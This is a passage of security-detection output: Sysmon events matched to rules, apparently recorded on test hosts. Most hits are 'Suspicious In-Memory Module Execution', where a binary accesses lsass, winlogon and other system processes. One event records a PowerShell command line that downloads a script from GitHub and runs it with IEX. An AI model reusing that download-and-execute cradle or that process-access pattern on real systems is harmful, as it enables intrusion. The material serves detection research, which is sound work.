	{
		"Rule level":"high",
		"title":"Suspicious Desktopimgdownldr Target File - 27653E30",
		"description":"Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension",
		"row_id":4930,
		"image":"C:\\Windows\\System32\\svchost.exe",
		"processguid":"747F3D96-2178-5EFE-0000-0010AADA5800",
		"processid":3324,
		"utctime":"2020-07-03 08:47:21.485",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":11,
		"eventrecordid":305356,
		"threadid":4016,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":11,
		"systemtime":"2020-07-03T08:47:21.491108Z",
		"version":2,
		"creationutctime":"2020-07-03 08:47:21.485",
		"targetfilename":"C:\\Users\\IEUser\\AppData\\Local\\Temp\\Personalization\\LockScreenImage\\LockScreenImage_uXQ8IiHL80mkJsKc319JaA.7z"
	},
	{
		"Rule level":"medium",
		"title":"Encoded PowerShell Command Line - E425013A",
		"description":"Detects specific combinations of encoding methods in the PowerShell command lines",
		"row_id":483,
		"commandline":"powershell  -c \"(New-Object Net.WebClient).DownloadFile(\u0027https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt\u0027,\u0027Default_File_Path.ps1\u0027);IEX((-Join([IO.File]::ReadAllBytes(\u0027Default_File_Path.ps1\u0027)|ForEach-Object{[Char]$_})))\"",
		"company":"Microsoft Corporation",
		"currentdirectory":"C:\\Windows\\system32\\",
		"description":"Windows PowerShell",
		"fileversion":"10.0.17763.1 (WinBuild.160101.0800)",
		"hashes":"SHA1=6CBCE4A295C163791B60FC23D285E6D84F28EE4C,MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
		"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"integritylevel":"High",
		"logonguid":"747F3D96-6053-5D3F-0000-002082314100",
		"logonid":"0x413182",
		"parentcommandline":"cmd  /c powershell -c \"(New-Object Net.WebClient).DownloadFile(\u0027https://raw.githubusercontent.com/op7ic/EDR-Testing-Script/master/Payloads/CradleTest.txt\u0027,\u0027Default_File_Path.ps1\u0027);IEX((-Join([IO.File]::ReadAllBytes(\u0027Default_File_Path.ps1\u0027)|ForEach-Object{[Char]$_})))\"",
		"parentimage":"C:\\Windows\\System32\\cmd.exe",
		"parentprocessguid":"747F3D96-6623-5D3F-0000-001011F68700",
		"parentprocessid":5816,
		"processguid":"747F3D96-6623-5D3F-0000-0010BC068800",
		"processid":2640,
		"product":"Microsoft\u00ae Windows\u00ae Operating System",
		"terminalsessionid":1,
		"user":"MSEDGEWIN10\\IEUser",
		"utctime":"2019-07-29 21:33:23.380",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":1,
		"eventrecordid":4912,
		"threadid":3476,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":1,
		"systemtime":"2019-07-29T21:33:23.507565Z",
		"version":5
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":83,
		"processid":2844,
		"utctime":"2020-03-21 21:45:04.906",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":10,
		"eventrecordid":244865,
		"threadid":3648,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2020-03-21T21:45:04.908857Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+9fc14|C:\\Windows\\System32\\KERNELBASE.dll+20d5e|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\1cccb0a82af13af5a3d3066dbdb9f984\\System.ni.dll+381f60|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\1cccb0a82af13af5a3d3066dbdb9f984\\System.ni.dll+2fa12e|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\1cccb0a82af13af5a3d3066dbdb9f984\\System.ni.dll+2f8cd5|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\1cccb0a82af13af5a3d3066dbdb9f984\\System.ni.dll+2c3b1e|C:\\Windows\\assembly\\NativeImages_v4.0.30319_64\\System\\1cccb0a82af13af5a3d3066dbdb9f984\\System.ni.dll+2c01f5|UNKNOWN(00007FF9A864D41C)",
		"grantedaccess":"0x1f3fff",
		"sourceimage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"sourceprocessguid":"747F3D96-26FD-5E76-0000-00100A320D01",
		"sourceprocessid":8004,
		"sourcethreadid":108,
		"targetimage":"C:\\Windows\\Explorer.EXE",
		"targetprocessguid":"747F3D96-06AA-5E76-0000-001046E10400",
		"targetprocessid":4668
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":85,
		"processid":2844,
		"utctime":"2020-03-21 21:45:04.906",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"MSEDGEWIN10",
		"eventid":10,
		"eventrecordid":244867,
		"threadid":3648,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2020-03-21T21:45:04.923222Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+a0fa4|C:\\Windows\\System32\\KERNELBASE.dll+48142|C:\\Windows\\System32\\KERNELBASE.dll+45a1a|C:\\Windows\\System32\\KERNELBASE.dll+455a6|C:\\Windows\\System32\\KERNEL32.DLL+1c153|UNKNOWN(00007FF9A864DCCE)",
		"grantedaccess":"0x1fffff",
		"sourceimage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
		"sourceprocessguid":"747F3D96-26FD-5E76-0000-00100A320D01",
		"sourceprocessid":8004,
		"sourcethreadid":108,
		"targetimage":"C:\\windows\\system32\\cmd.exe",
		"targetprocessguid":"747F3D96-8AE0-5E76-0000-0010933B8003",
		"targetprocessid":7708
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":177,
		"processid":5320,
		"utctime":"2020-07-02 18:00:29.642",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"LAPTOP-JU4M3I0E",
		"eventid":10,
		"eventrecordid":2116723,
		"threadid":6908,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2020-07-02T18:00:29.650453Z",
		"version":3,
		"calltrace":"C:\\windows\\SYSTEM32\\ntdll.dll+9d8e4|C:\\windows\\System32\\KERNELBASE.dll+5f36a|C:\\windows\\System32\\KERNELBASE.dll+5c5ca|C:\\windows\\System32\\KERNELBASE.dll+5bd86|C:\\windows\\System32\\KERNEL32.DLL+5e90b|UNKNOWN(000002022934003D)",
		"grantedaccess":"0x1fffff",
		"sourceimage":"C:\\windows\\system32\\conhost.exe",
		"sourceprocessguid":"00247C92-1117-5EFE-0000-00105A024E3A",
		"sourceprocessid":29168,
		"sourcethreadid":19060,
		"targetimage":"C:\\windows\\system32\\notepad.exe",
		"targetprocessguid":"00247C92-20BD-5EFE-0000-00105C059D3A",
		"targetprocessid":16788
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":721,
		"processid":1920,
		"utctime":"2019-05-22 04:02:11.287",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":840,
		"threadid":824,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-05-22T04:02:11.307031Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4534c|C:\\Windows\\system32\\kernel32.dll+5112b|C:\\Windows\\system32\\kernel32.dll+5cc2f|C:\\Windows\\system32\\kernel32.dll+20ae|C:\\Windows\\system32\\kernel32.dll+8f5e3|UNKNOWN(966AF6DA)|UNKNOWN(966ADC9B)|UNKNOWN(966B2315)|UNKNOWN(82678E06)|C:\\Windows\\system32\\user32.DLL+15cdc|C:\\Windows\\system32\\user32.DLL+15d03|C:\\Windows\\system32\\user32.DLL+1cc40|C:\\Windows\\system32\\IEFRAME.dll+1a9cc|C:\\Windows\\system32\\IEFRAME.dll+4d1f8|C:\\Windows\\system32\\iertutil.dll+11971c|C:\\Program Files\\Internet Explorer\\IEShims.dll+3a31",
		"grantedaccess":"0x1fffff",
		"sourceimage":"C:\\Program Files\\Internet Explorer\\iexplore.exe",
		"sourceprocessguid":"365ABB72-C9C1-5CE4-0000-00100B222E00",
		"sourceprocessid":3156,
		"sourcethreadid":828,
		"targetimage":"C:\\Windows\\system32\\cmd.exe",
		"targetprocessguid":"365ABB72-C9C3-5CE4-0000-00101F422E00",
		"targetprocessid":2888
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1299,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8335,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.883638Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\System32\\smss.exe",
		"targetprocessguid":"365ABB72-F69F-5CC7-0000-0010132B0000",
		"targetprocessid":264
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1300,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8336,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\csrss.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-001033480000",
		"targetprocessid":336
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1301,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8337,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\wininit.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-0010A74B0000",
		"targetprocessid":384
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1302,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8338,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\csrss.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-00103F4C0000",
		"targetprocessid":392
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1303,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8339,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\winlogon.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-001043520000",
		"targetprocessid":440
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1304,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8340,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\services.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-001004550000",
		"targetprocessid":468
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1305,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8341,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\lsass.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-001072590000",
		"targetprocessid":492
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1306,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8342,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\lsm.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-0010A3590000",
		"targetprocessid":500
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
		"description":"Detects the access to processes by other suspicious processes which have reflectively loaded libraries in their memory space. An example is SilentTrinity C2 behaviour. Generally speaking, when Sysmon EventID 10 cannot reference a stack call to a dll loaded from disk (the standard way), it will display \"UNKNOWN\" as the module name. Usually this means the stack call points to a module that was reflectively loaded in memory. Adding to this, it is not common to see such few calls in the stack (ntdll.dll --\u003e kernelbase.dll --\u003e unknown) which essentially means that most of the functions required by the process to execute certain routines are already present in memory, not requiring any calls to external libraries. The latter should also be considered suspicious.",
		"row_id":1307,
		"processid":1876,
		"utctime":"2019-04-30 07:23:00.883",
		"channel":"Microsoft-Windows-Sysmon/Operational",
		"computer":"IEWIN7",
		"eventid":10,
		"eventrecordid":8343,
		"threadid":1444,
		"keywords":"0x8000000000000000",
		"level":4,
		"opcode":0,
		"guid":"5770385F-C22A-43E0-BF4C-06F5698FFBD9",
		"name":"Microsoft-Windows-Sysmon",
		"userid":"S-1-5-18",
		"task":10,
		"systemtime":"2019-04-30T07:23:00.899263Z",
		"version":3,
		"calltrace":"C:\\Windows\\SYSTEM32\\ntdll.dll+4595c|C:\\Windows\\system32\\KERNELBASE.dll+8185|UNKNOWN(01770343)|UNKNOWN(0176FF9D)|UNKNOWN(0176F8EC)|UNKNOWN(00397486)|UNKNOWN(003973A0)|UNKNOWN(003978A3)|C:\\Windows\\system32\\kernel32.dll+4ef8c|C:\\Windows\\SYSTEM32\\ntdll.dll+6367a|C:\\Windows\\SYSTEM32\\ntdll.dll+6364d",
		"grantedaccess":"0x1410",
		"sourceimage":"D:\\m.exe",
		"sourceprocessguid":"365ABB72-F7C9-5CC7-0000-0010BF010E00",
		"sourceprocessid":3772,
		"sourcethreadid":1088,
		"targetimage":"C:\\Windows\\system32\\svchost.exe",
		"targetprocessguid":"365ABB72-F6A1-5CC7-0000-0010BB700000",
		"targetprocessid":616
	},
	{
		"Rule level":"critical",
		"title":"Suspicious In-Memory Module Execution - 8B78C085",
